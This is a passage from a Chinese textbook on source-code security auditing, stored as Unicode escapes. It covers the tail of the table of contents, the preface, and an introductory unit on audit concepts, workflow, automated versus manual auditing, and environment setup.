[13.2.2 Mybatis\u7684SQL\u6CE8\u5165... 242](#_Toc78147507)\r
\r
[13.2.3   Java\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u9632\u5FA1... 245](#_Toc78147508)\r
\r
[13.2.4   OFCMS\u5E73\u53F0SQL\u6CE8\u5165\u6F0F\u6D1E\u5206\u6790... 246](#_Toc78147509)\r
\r
[13.3 Java\u4EE3\u7801\u4E2D\u7684XSS\u6F0F\u6D1E... 248](#_Toc78147510)\r
\r
[13.3.1 Java\u4E2D\u7684XSS\u6F0F\u6D1E... 248](#_Toc78147511)\r
\r
[13.3.2   Java\u4E2DXSS\u6F0F\u6D1E\u9632\u5FA1... 251](#_Toc78147512)\r
\r
[13.3.3   JEESNS\u5E73\u53F0XSS\u6F0F\u6D1E\u5206\u6790... 253](#_Toc78147513)\r
\r
[13.4       Java\u4EE3\u7801\u4E2D\u7684\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E... 255](#_Toc78147514)\r
\r
[13.4.1 Java\u4E2D\u7684\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E... 255](#_Toc78147515)\r
\r
[13.4.2 Java\u4E2D\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u9632\u5FA1... 257](#_Toc78147516)\r
\r
[13.5 Java\u4EE3\u7801\u4E2D\u7684\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E... 257](#_Toc78147517)\r
\r
[13.5.1 Java\u4E2D\u7684\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E... 257](#_Toc78147518)\r
\r
[13.5.2 Java\u4E2D\u7684\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E... 260](#_Toc78147519)\r
\r
[13.5.3 Java\u4E2D\u7684\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E... 262](#_Toc78147520)\r
\r
[13.5.4 MCMS\u5E73\u53F0\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u5206\u6790... 262](#_Toc78147521)\r
\r
[13.6 Java\u4EE3\u7801\u4E2D\u7684SSRF\u6F0F\u6D1E... 263](#_Toc78147522)\r
\r
[13.6.1 Java\u4E2D\u7684SSRF\u6F0F\u6D1E... 263](#_Toc78147523)\r
\r
[13.6.2 Java\u4E2D\u7684SSRF\u6F0F\u6D1E\u9632\u5FA1... 265](#_Toc78147524)\r
\r
[13.6.3 Hawtio\u5E73\u53F0SSRF\u6F0F\u6D1E\u5206\u6790... 265](#_Toc78147525)\r
\r
[13.7 \u5355\u5143\u5C0F\u7ED3... 268](#_Toc78147526)\r
\r
[\u5355\u514314 Python\u6846\u67B6\u5B89\u5168... 269](#_Toc78147527)\r
\r
[14.1 Django\u6846\u67B6\u4ECB\u7ECD... 269](#_Toc78147528)\r
\r
[14.1.1 Django\u6846\u67B6\u7B80\u4ECB... 269](#_Toc78147529)\r
\r
[14.1.2 \u5B9E\u9A8C\uFF1ADjango\u642D\u5EFA... 272](#_Toc78147530)\r
\r
[14.2 Django\u6846\u67B6\u5E38\u89C1\u6F0F\u6D1E... 274](#_Toc78147531)\r
\r
[14.2.1 Django\u4E2D\u7684XSS\u6F0F\u6D1E... 274](#_Toc78147532)\r
\r
[14.2.2 Django\u7684XSS\u6848\u4F8B... 276](#_Toc78147533)\r
\r
[14.2.3 Django\u4E2D\u7684CSRF\u6F0F\u6D1E... 279](#_Toc78147534)\r
\r
[14.2.4 Django\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E... 280](#_Toc78147535)\r
\r
[14.2.5 Django\u4E2D\u7684\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E... 280](#_Toc78147536)\r
\r
[14.2.6 Django\u4E2D\u7684\u5176\u4ED6\u6F0F\u6D1E... 282](#_Toc78147537)\r
\r
[14.3 Flask\u6846\u67B6\u5E38\u89C1\u6F0F\u6D1E... 283](#_Toc78147538)\r
\r
[14.3.1 Flask\u6846\u67B6\u4ECB\u7ECD... 283](#_Toc78147539)\r
\r
[12.3.2   Flask\u4E2DSSTI\u6F0F\u6D1E... 284](#_Toc78147540)\r
\r
[14.4 Tornado\u6846\u67B6\u5E38\u89C1\u6F0F\u6D1E... 286](#_Toc78147541)\r
\r
[14.4.1 Tornado\u6846\u67B6\u4ECB\u7ECD... 286](#_Toc78147542)\r
\r
[14.4.2 Tornado\u4E2D\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E... 287](#_Toc78147543)\r
\r
[14.5 \u5355\u5143\u5C0F\u7ED3... 290](#_Toc78147544)\r
\r
[\u672F\u8BED\u8868... 291](#_Toc78147545)\r
\r
 \r
\r
\r
\r
 \r
\r
# \u524D\u8A00\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u662F\u4E00\u79CD\u4EE5\u53D1\u73B0\u7A0B\u5E8F\u9519\u8BEF\u3001\u5B89\u5168\u6F0F\u6D1E\u548C\u8FDD\u53CD\u7A0B\u5E8F\u89C4\u8303\u4E3A\u76EE\u6807\u7684\u6E90\u4EE3\u7801\u5206\u6790\u6280\u672F\uFF0C\u662F\u5BF9\u7A0B\u5E8F\u7F16\u5199\u8FC7\u7A0B\u4E2D\u6E90\u4EE3\u7801\u7684\u5168\u9762\u5206\u6790\uFF0C\u5176\u76EE\u7684\u662F\u53D1\u73B0\u9519\u8BEF\uFF0C\u627E\u5230\u5B89\u5168\u9690\u60A3\uFF0C\u4ECE\u800C\u63D0\u9AD8\u7A0B\u5E8F\u7684\u5B89\u5168\u6027\u548C\u53EF\u9760\u6027\uFF0C\u51CF\u5C11\u53D7\u5230\u7F51\u7EDC\u653B\u51FB\u7684\u53EF\u80FD\u6027\u3002\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u7684\u65B9\u6CD5\u901A\u5E38\u5305\u62EC\uFF1A\u767D\u76D2\u3001\u9ED1\u76D2\u3001\u7070\u76D2\u7B49\u65B9\u5F0F\u3002\u767D\u76D2\u662F\u6307\u901A\u8FC7\u5BF9\u6E90\u4EE3\u7801\u7684\u5206\u6790\u627E\u5230\u5E94\u7528\u7F3A\u9677\uFF0C\u9ED1\u76D2\u901A\u5E38\u4E0D\u6D89\u53CA\u5230\u6E90\u4EE3\u7801\uFF0C\u591A\u4F7F\u7528\u6A21\u7CCA\u6D4B\u8BD5\u7684\u65B9\u5F0F\uFF0C\u800C\u7070\u76D2\u5219\u662F\u9ED1\u767D\u7ED3\u5408\u7684\u65B9\u5F0F\u3002\u4E0E\u5176\u4ED6\u4FE1\u606F\u5B89\u5168\u6280\u672F\u76F8\u6BD4\uFF0C\u4EE3\u7801\u5BA1\u8BA1\u662F\u4E00\u79CD\u4E3B\u52A8\u5B89\u5168\u9632\u5FA1\u6280\u672F\uFF0C\u901A\u8FC7\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u53EF\u4EE5\u4ECE\u6839\u672C\u4E0A\u52A0\u5F3A\u7CFB\u7EDF\u7684\u5B89\u5168\u6027\u548C\u53EF\u9760\u6027\uFF0C\u5BF9\u63D0\u9AD8\u4FE1\u606F\u7CFB\u7EDF\u7684\u5B89\u5168\u6027\uFF0C\u51CF\u5C11\u56E0\u4FE1\u606F\u7CFB\u7EDF\u6F0F\u6D1E\u9020\u6210\u7684\u635F\u5931\u6709\u91CD\u8981\u7684\u610F\u4E49\u548C\u4F5C\u7528\u3002\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u8981\u6C42\u7684\u95E8\u69DB\u8F83\u9AD8\uFF0C\u901A\u5E38\u9700\u8981\u5BA1\u8BA1\u4EBA\u5458\u5BF9PHP\u4EE3\u7801\u975E\u5E38\u719F\u6089\u4E14\u5177\u6709\u591A\u5E74\u7684\u4ECE\u4E1A\u7ECF\u9A8C\uFF0C\u80FD\u591F\u5BF9\u5E38\u89C1\u6846\u67B6\u3001\u5E38\u89C1CMS\u3001\u5E38\u89C1\u529F\u80FD\u6F0F\u6D1E\u6709\u5206\u6790\u7ECF\u9A8C\u3002\u9664\u6B64\u4E4B\u5916\uFF0C\u53EF\u4EE5\u5BF9\u591A\u79CD\u7F16\u7A0B\u8BED\u8A00\u8FDB\u884C\u5206\u6790\u5BA1\u8BA1\u3002\u56E0\u6B64\uFF0C\u672C\u4E66\u5C06\u4EE5\u6559\u5B66\u4E3A\u76EE\u7684\u5BF9\u4EE3\u7801\u5BA1\u8BA1\u8BFE\u7A0B\u8FDB\u884C\u8BB2\u8FF0\uFF0C\u540C\u65F6\u914D\u4EE5\u76F8\u5E94\u6F0F\u6D1E\u7684CMS\u5BA1\u8BA1\u5B9E\u8DF5\u4ECE\u800C\u6DF1\u5316\u8BFB\u8005\u5BF9\u4EE3\u7801\u5BA1\u8BA1\u7684\u7406\u89E3\u3002\r
\r
\u672C\u4E66\u9996\u5148\u5BF9\u4EE3\u7801\u5BA1\u8BA1\u7684\u5B9A\u4E49\u3001\u4EE3\u7801\u5BA1\u8BA1\u7684\u6D41\u7A0B\u3001\u4EE3\u7801\u5BA1\u8BA1\u7684\u5206\u7C7B\u8FDB\u884C\u4E86\u7CFB\u7EDF\u7684\u4ECB\u7ECD\uFF0C\u4EE5PhpStudy\u4E3A\u4F8B\uFF0C\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u73AF\u5883\u7684\u642D\u5EFA\uFF0C\u5E76\u4ECB\u7ECD\u4E86\u5F53\u524D\u5E38\u7528\u7684\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u3002\u63A5\u4E0B\u6765\uFF0C\u8BE6\u7EC6\u4ECB\u7ECD\u4E86SQL\u6CE8\u5165\u6F0F\u6D1E\u5BA1\u8BA1\u3001XSS\u6F0F\u6D1E\u5BA1\u8BA1\u3001CSRF\u8BF7\u6C42\u4F2A\u9020\u6F0F\u6D1E\u5BA1\u8BA1\u3001\u4EE3\u7801\u6267\u884C\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u3001\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\u3001XXE\u4E0ESSRF\u6F0F\u6D1E\u5BA1\u8BA1\u3001\u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5BA1\u8BA1\u3001\u53D8\u91CF\u8986\u76D6\u4E0E\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u5BA1\u8BA1\u3001\u4E1A\u52A1\u529F\u80FD\u5BA1\u8BA1\u7B49\u5185\u5BB9\u3002\u6700\u540E\u4ECB\u7ECD\u4E86\u5BF9\u5F53\u524D\u5E38\u7528\u7684\u7A0B\u5E8F\u8BBE\u8BA1\u8BED\u8A00JAVA\u548CPython\u7684\u4EE3\u7801\u5BA1\u8BA1\u6848\u4F8B\u3002\r
\r
\u672C\u4E66\u7531\u5929\u6D25\u804C\u4E1A\u5927\u5B66\u7535\u5B50\u4FE1\u606F\u4E0E\u5DE5\u7A0B\u5B66\u9662\u7684\u65F6\u745E\u9E4F\u4E3B\u7F16\uFF0C\u8D1F\u8D23\u5168\u4E66\u7EDF\u7A3F\uFF0C\u5B89\u539A\u9716\u3001\u674E\u56FD\u8F89\u4EFB\u526F\u4E3B\u7F16\u3002\u5728\u7F16\u5199\u8FC7\u7A0B\u4E2D\uFF0C\u5F97\u5230360\u7F51\u7EDC\u5B89\u5168\u5927\u5B66\u5E73\u53F0\u7684\u5E2E\u52A9\u4E0E\u652F\u6301\uFF0C\u8BFB\u8005\u53EF\u5728\u8BE5\u5E73\u53F0\u8FDB\u884C\u89C6\u9891\u3001\u6559\u5B66PPT\u3001\u5B9E\u9A8C\u5B9E\u8DF5\u5B66\u4E60\u3002\u540C\u65F6\uFF0C\u672C\u4E66\u6CE8\u91CD\u6240\u8FF0\u5185\u5BB9\u7684\u53EF\u64CD\u4F5C\u6027\u548C\u5B9E\u7528\u6027\uFF0C\u4EE5\u7F51\u7EDC\u5B89\u5168\u7BA1\u7406\u4EBA\u5458\u4E3A\u4E3B\u8981\u8BFB\u8005\u7FA4\u4F53\uFF0C\u540C\u65F6\u517C\u987E\u5E7F\u5927\u8BA1\u7B97\u673A\u7F51\u7EDC\u7231\u597D\u8005\u7684\u9700\u6C42\uFF0C\u662F\u4E00\u672C\u8FDB\u884C\u7F51\u7EDC\u64CD\u4F5C\u7CFB\u7EDF\u5B89\u5168\u7BA1\u7406\u7684\u5B9E\u7528\u6559\u6750\u548C\u5FC5\u5907\u7684\u91CD\u8981\u53C2\u8003\u4E66\u3002\u9650\u4E8E\u4F5C\u8005\u7684\u77E5\u8BC6\u6C34\u5E73\u548C\u8BA4\u77E5\u80FD\u529B\uFF0C\u4E66\u4E2D\u80AF\u5B9A\u5B58\u5728\u4E00\u4E9B\u4E0D\u5F53\u4E4B\u5904\uFF0C\u6073\u8BF7\u8BFB\u8005\u6279\u8BC4\u6307\u6B63\u3002\r
\r
 \r
\r
\u200B                               \u4F5C\u8005\r
\r
\u200B                              2021\u5E747\u6708\r
\r
\r
\r
 \r
\r
# \u5355\u51431 \u4EE3\u7801\u5BA1\u8BA1\u57FA\u7840\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u9700\u8981\u5177\u5907\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u56DB\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4E3B\u8981\u4ECB\u7ECD\u4EE3\u7801\u5BA1\u8BA1\u7684\u57FA\u672C\u6982\u5FF5\uFF0C\u5305\u62EC\uFF1A\u4EE3\u7801\u5BA1\u8BA1\u7684\u5B9A\u4E49\u3001\u4EE3\u7801\u5BA1\u8BA1\u7684\u6D41\u7A0B\u7B49\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4EE5PhpStudy\u642D\u5EFA\u9A91\u58EBCMS\u4EBA\u624D\u7CFB\u7EDF\u4E3A\u6848\u4F8B\uFF0C\u8BE6\u7EC6\u4ECB\u7ECDWindows\u53CALinux\u64CD\u4F5C\u7CFB\u7EDF\u4E0BPHP\u4EE3\u7801\u5BA1\u8BA1\u73AF\u5883\u642D\u5EFA\u65B9\u6CD5\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECD\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u5E38\u7528\u7684\u5BA1\u8BA1\u5DE5\u5177\uFF0C\u5305\u62EC\uFF1A\u81EA\u52A8\u5BA1\u8BA1\u5DE5\u5177\u3001\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\u3001\u4EE3\u7801\u5BA1\u8BA1\u8F85\u52A9\u5DE5\u5177\uFF0C\u5305\u62EC\uFF1A\u6B63\u5219\u8868\u8FBE\u5F0F\u3001\u6570\u636E\u5305\u5206\u6790\u3001\u7F16\u89E3\u7801\u3001\u52A0\u89E3\u5BC6\u3001\u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\u7B49\u5E38\u7528\u5DE5\u5177\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4ECB\u7ECD\u4EE3\u7801\u5BA1\u8BA1\u4E2DPhpStorm\u4E0EXdebug\u52A8\u6001\u8C03\u8BD5\u73AF\u5883\u642D\u5EFA\u65B9\u6CD5\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1. \u4E86\u89E3\u4EE3\u7801\u5BA1\u8BA1\u6982\u5FF5\uFF1B\r
\r
\\2. \u638C\u63E1\u4EE3\u7801\u5BA1\u8BA1CMS\u73AF\u5883\u642D\u5EFA\u65B9\u6CD5\uFF1B\r
\r
\\3. \u719F\u6089\u5E38\u7528\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u4F7F\u7528\u65B9\u6CD5\uFF1B\r
\r
\\4. \u638C\u63E1\u4EE3\u7801\u5BA1\u8BA1\u52A8\u6001\u73AF\u5883\u642D\u5EFA\u65B9\u6CD5\u3002\r
\r
## 1.1 \u4EE3\u7801\u5BA1\u8BA1\u7B80\u4ECB\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u65E2\u662F\u4F01\u4E1A\u5B89\u5168\u8FD0\u8425\u53CA\u5B89\u5168\u4ECE\u4E1A\u8005\u5FC5\u5907\u7684\u57FA\u672C\u6280\u80FD\uFF0C\u4E5F\u662F\u4E00\u79CD\u4EE5\u53D1\u73B0\u7A0B\u5E8F\u9519\u8BEF\u3001\u5B89\u5168\u6F0F\u6D1E\u548C\u8FDD\u53CD\u7A0B\u5E8F\u89C4\u8303\u4E3A\u76EE\u6807\u7684\u6E90\u4EE3\u7801\u5206\u6790\u6280\u80FD\uFF0C\u672C\u5C0F\u8282\u5C06\u5BF9\u4EE3\u7801\u5BA1\u8BA1\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
### 1.1.1 \u4EE3\u7801\u5BA1\u8BA1\u5B9A\u4E49 \r
\r
\u4EE3\u7801\u5BA1\u8BA1\u662F\u9632\u5FA1\u6027\u7F16\u7A0B\u8303\u5F0F\u7684\u4E00\u90E8\u5206\uFF0C\u5176\u65E8\u5728\u68C0\u6D4B\u4EE3\u7801\u4E2D\u5B58\u5728\u7684\u5B89\u5168\u7F3A\u9677\uFF0C\u9488\u5BF9\u5B58\u5728\u7684\u7F3A\u9677\u63D0\u4F9B\u89E3\u51B3\u65B9\u6848\uFF0C\u964D\u4F4E\u7A0B\u5E8F\u4F7F\u7528\u65F6\u7684\u5B89\u5168\u98CE\u9669\u3002\u901A\u8FC7\u4EE3\u7801\u5BA1\u8BA1\u51E0\u4E4E\u53EF\u4EE5\u901A\u8FC7\u5BF9\u6E90\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\u7684\u65B9\u5F0F\u53D1\u73B0\u6240\u6709\u4EE3\u7801\u5C42\u9762\u7684\u5B89\u5168\u6F0F\u6D1E\uFF0C\u5305\u62EC\uFF1A\u5E38\u89C1\u7684Web\u5B89\u5168\u6F0F\u6D1E\u3001\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u3001\u5E94\u7528\u7A0B\u5E8F\u6F0F\u6D1E\u4EE5\u53CA\u5E94\u7528\u7A0B\u5E8F\u914D\u7F6E\u6587\u4EF6\u4E2D\u7684\u4E0D\u5B89\u5168\u56E0\u7D20\u7B49\u3002\r
\r
\u5728\u8F6F\u4EF6\u53D1\u5E03\u524D\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u53EF\u5C06\u4E0D\u5B89\u5168\u56E0\u7D20\u627C\u6740\u5728\u840C\u82BD\u72B6\u6001\uFF0C\u6781\u5927\u7F29\u51CF\u4E86\u540E\u671F\u4FEE\u590D\u6240\u82B1\u8D39\u7684\u6210\u672C\u3002\u6D4B\u8BD5\u8FC7\u7A0B\u4E0D\u4F1A\u5BF9\u7EBF\u4E0A\u4E1A\u52A1\u9020\u6210\u5F71\u54CD\uFF0C\u4E0D\u4F1A\u5BFC\u81F4\u8BF8\u5982\u7CFB\u7EDF\u5B95\u673A\u3001\u670D\u52A1\u5361\u6B7B\u3001\u6570\u636E\u5E93\u963B\u585E\u548C\u4E1A\u52A1\u6570\u636E\u4E22\u5931\u7B49\u98CE\u9669\u3002\u4F46\u7531\u4E8E\u4EE3\u7801\u5BA1\u8BA1\u9700\u8981\u6DF1\u5165\u7406\u89E3\u4EE3\u7801\u903B\u8F91\u548C\u4E1A\u52A1\u7ED3\u6784\uFF0C\u56E0\u6B64\u5BF9\u5BA1\u8BA1\u4EBA\u5458\u7684\u80FD\u529B\u7D20\u8D28\u8981\u6C42\u8F83\u9AD8\uFF0C\u9700\u8981\u82B1\u8D39\u7684\u7CBE\u529B\u4E5F\u66F4\u591A\u3002\r
\r
\u901A\u5E38\u4EE3\u7801\u5BA1\u8BA1\u7684\u5BF9\u8C61\u53EF\u4EE5\u662F\u51E0\u4E4E\u6240\u6709\u7684\u7F16\u7A0B\u8BED\u8A00\uFF0C\u5E38\u89C1\u7684\u8BED\u8A00\u5305\u62EC\uFF1AJava\u3001C\u3001C#\u3001PHP\u3001Python\u548CJSP\u7B49,\u672C\u4E66\u5C06\u4EE5PHP\u4E3A\u4E3B\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u6848\u4F8B\u4ECB\u7ECD\u3002\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u4F5C\u4E3A\u5B89\u5168\u9886\u57DF\u4E2D\u96BE\u5EA6\u8F83\u9AD8\u7684\u4E00\u95E8\u5B66\u79D1\uFF0C\u9700\u8981\u8BFB\u8005\u5728\u5B66\u4E60\u672C\u8BFE\u7A0B\u4E4B\u524D\u5177\u5907\u4EE5\u4E0B\u6761\u4EF6\uFF1A\r
\r
l \u719F\u6089PHP\u5F00\u53D1\u8BED\u8A00\r
\r
l \u719F\u6089Web\u5B89\u5168\u5E38\u89C1\u6F0F\u6D1E\u53CA\u5229\u7528\u65B9\u6CD5\r
\r
l \u719F\u6089\u6570\u636E\u5E93\u8BED\u8A00\r
\r
### 1.1.2 \u4EE3\u7801\u5BA1\u8BA1\u6D41\u7A0B \r
\r
\u5BF9\u7A0B\u5E8F\u4EE3\u7801\u8FDB\u884C\u767D\u76D2\uFF08\u4EE3\u7801\u5BA1\u8BA1\uFF09\u7684\u65B9\u5F0F\u68C0\u67E5\u5E94\u7528\u7A0B\u5E8F\u7684\u5B89\u5168\u6027\uFF0C\u5728\u4EE3\u7801\u5BA1\u8BA1\u521D\u671F\uFF0C\u9700\u8981\u6E90\u4EE3\u7801\u5BA1\u8BA1\u4EBA\u5458\u5BA1\u8BA1Web\u5E94\u7528\u7684\u67B6\u6784\u8BBE\u8BA1\u3001\u529F\u80FD\u6A21\u5757\uFF0C\u5E76\u4E0E\u5BA2\u6237\u76F8\u5173\u4EBA\u5458\u534F\u5546\u5BA1\u8BA1\u91CD\u70B9\u53CA\u4EE3\u7801\u63D0\u4F9B\u7B49\u4FE1\u606F\u3002\u7136\u540E\uFF0C\u6E90\u4EE3\u7801\u5BA1\u8BA1\u4EBA\u5458\u4F7F\u7528\u5DE5\u5177\u5BF9\u6E90\u4EE3\u7801\u7684\u8106\u5F31\u6027\u548C\u5B89\u5168\u578B\u8FDB\u884C\u521D\u6B65\u5206\u6790\uFF0C\u6839\u636E\u5BA2\u6237\u5173\u6CE8\u7684\u91CD\u70B9\u5BF9\u6E90\u4EE3\u7801\u8FDB\u884C\u624B\u5DE5\u5BA1\u8BA1\u3002\r
\r
\u4E00\u822C\u60C5\u51B5\u4E0B\uFF0C\u4EE3\u7801\u5BA1\u8BA1\u7684\u57FA\u672C\u6D41\u7A0B\u4E3B\u8981\u5305\u62EC\u56DB\u4E2A\u9636\u6BB5\u5982\u56FE1-1\u6240\u793A\uFF0C\u5176\u5206\u522B\u662F\uFF1A\r
\r
l \u4EE3\u7801\u5BA1\u8BA1\u9636\u6BB5\r
\r
l \u5BA1\u8BA1\u5B9E\u65BD\u9636\u6BB5\r
\r
l \u5BA1\u8BA1\u590D\u67E5\u9636\u6BB5\r
\r
l \u6210\u679C\u6C47\u62A5\u9636\u6BB5\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)\r
\r
\u56FE1-1 \u4EE3\u7801\u5BA1\u8BA1\u6D41\u7A0B\u56FE\r
\r
\u5BA1\u8BA1\u4EBA\u5458\u5BF9\u7A0B\u5E8F\u6E90\u4EE3\u7801\u4F7F\u7528\u81EA\u52A8\u5316\u5BA1\u8BA1\u5DE5\u5177\u8FDB\u884C\u6F0F\u6D1E\u626B\u63CF\uFF0C\u5E76\u5BF9\u626B\u63CF\u7ED3\u679C\u8FDB\u884C\u4EBA\u5DE5\u5BA1\u8BA1\u786E\u8BA4\uFF0C\u5982\u56FE1-2\u6240\u793A\u3002\u540C\u65F6\uFF0C\u8FD8\u9700\u5BF9\u6E90\u4EE3\u7801\u7684\u5E38\u89C4\u6F0F\u6D1E\u548C\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u6700\u7EC8\u8F93\u51FA\u4EE3\u7801\u5BA1\u8BA1\u62A5\u544A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)\r
\r
\u56FE1-2 \u4EE3\u7801\u5BA1\u8BA1\u6D41\u7A0B\u56FE\r
\r
### 1.1.3 \u4EE3\u7801\u5BA1\u8BA1\u5206\u7C7B \r
\r
\u4EE3\u7801\u5BA1\u8BA1\u6240\u91C7\u7528\u7684\u65B9\u5F0F\u4E3B\u8981\u5305\u62EC\uFF1A\u5DE5\u5177\u5BA1\u8BA1\u3001\u4EBA\u5DE5\u786E\u8BA4\u3001\u4EBA\u5DE5\u62BD\u53D6\u4EE3\u7801\u8FDB\u884C\u68C0\u67E5\u3002\u4EE3\u7801\u5BA1\u8BA1\u5206\u7C7B\u5305\u62EC\uFF1A\u81EA\u52A8\u5316\u5BA1\u8BA1\u548C\u4EBA\u5DE5\u5BA1\u8BA1\u3002\u5728\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u901A\u5E38\u91C7\u7528\u4E0A\u8FF0\u4E24\u79CD\u65B9\u6CD5\u76F8\u7ED3\u5408\u7684\u65B9\u5F0F\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u8FD9\u80FD\u591F\u4FDD\u8BC1\u5BF9\u5E94\u7528\u7A0B\u5E8F\u4EE3\u7801\u5BA1\u8BA1\u7684\u5168\u9762\u6027\u3002\r
\r
1.\u81EA\u52A8\u5316\u5BA1\u8BA1\r
\r
\u5728\u6E90\u4EE3\u7801\u7684\u9759\u6001\u5B89\u5168\u5BA1\u8BA1\u4E2D\uFF0C\u4F7F\u7528\u81EA\u52A8\u5316\u5BA1\u8BA1\u5DE5\u5177\u4EE3\u66FF\u4EBA\u5DE5\u6F0F\u6D1E\u6316\u6398\uFF0C\u53EF\u4EE5\u663E\u8457\u63D0\u9AD8\u5BA1\u8BA1\u5DE5\u4F5C\u7684\u6548\u7387\u3002\u4F46\u662F\uFF0C\u81EA\u52A8\u5316\u5BA1\u8BA1\u4E5F\u5B58\u5728\u7F3A\u70B9\uFF0C\u5305\u62EC\uFF1A\r
\r
l \u6F0F\u6D1E\u8BEF\u62A5\u591A\uFF1A\u5F88\u591A\u81EA\u52A8\u5316\u626B\u63CF\u51FA\u7684\u6F0F\u6D1E\u90FD\u4E0D\u51C6\u786E\uFF0C\u9700\u8981\u4EBA\u5DE5\u5BA1\u8BA1\u8FDB\u884C\u786E\u8BA4\uFF1B\r
\r
l \u6F0F\u6D1E\u8BC6\u522B\u7387\u4F4E\uFF1A\u4E8C\u6B21\u6CE8\u5165\u3001\u903B\u8F91\u5B89\u5168\u7B49\u6F0F\u6D1E\u4E0D\u80FD\u88AB\u626B\u63CF\u5DE5\u5177\u8BC6\u522B\u3002\r
\r
2.\u4EBA\u5DE5\u5BA1\u8BA1\r
\r
\u76F8\u6BD4\u4E8E\u81EA\u52A8\u5316\u5BA1\u8BA1\u800C\u8A00\uFF0C\u4EBA\u5DE5\u5BA1\u8BA1\u66F4\u52A0\u51C6\u786E\uFF0C\u5374\u4E5F\u66F4\u52A0\u8017\u8D39\u65F6\u95F4\u4E0E\u7CBE\u529B\u3002\u4EBA\u5DE5\u5BA1\u8BA1\u901A\u5E38\u8981\u4ECE\u7A0B\u5E8F\u7684\u914D\u7F6E\u6587\u4EF6\u5F00\u59CB\u68B3\u7406\u7CFB\u7EDF\uFF0C\u4F8B\u5982\uFF1Aapplication-context.xml\u3001php.ini\u3001web.xml\u7B49\u3002\u7136\u540E\u5206\u6790\u7A0B\u5E8F\u7684\u6570\u636E\u6D41\uFF0C\u9488\u5BF9\u7A0B\u5E8F\u5F00\u53D1\u6846\u67B6\u4E0D\u540C\uFF0C\u5176\u4F20\u9012\u7684\u6D41\u7A0B\u4E5F\u4E0D\u5C3D\u76F8\u540C\u3002\r
\r
## 1.2 \u4EE3\u7801\u5BA1\u8BA1\u73AF\u5883\u642D\u5EFA\r
\r
\u7531\u4E8E\u5F88\u591A\u6F0F\u6D1E\u90FD\u4F9D\u8D56\u4E8E\u8F6F\u4EF6\u7248\u672C\uFF0C\u4F8B\u5982\uFF1A\u6587\u4EF6\u89E3\u6790\u6F0F\u6D1E\u3001\u4E2D\u95F4\u4EF6\u6F0F\u6D1E\u3002\u56E0\u6B64\u4EE3\u7801\u5BA1\u8BA1\u7684\u73AF\u5883\u642D\u5EFA\u9700\u79C9\u627F\u4EE5\u4E0B\u539F\u5219\uFF1A\r
\r
l \u73AF\u5883\u642D\u5EFA\u8FC7\u7A0B\u5C3D\u91CF\u7B80\u5355\u6613\u7BA1\u7406\uFF1B\r
\r
l \u73AF\u5883\u652F\u6301\u5F00\u53D1\u8BED\u8A00\u3001\u6570\u636E\u5E93\u7B49\u4F9D\u8D56\u73AF\u5883\u652F\u6301\u591A\u79CD\u7248\u672C\u3002\r
\r
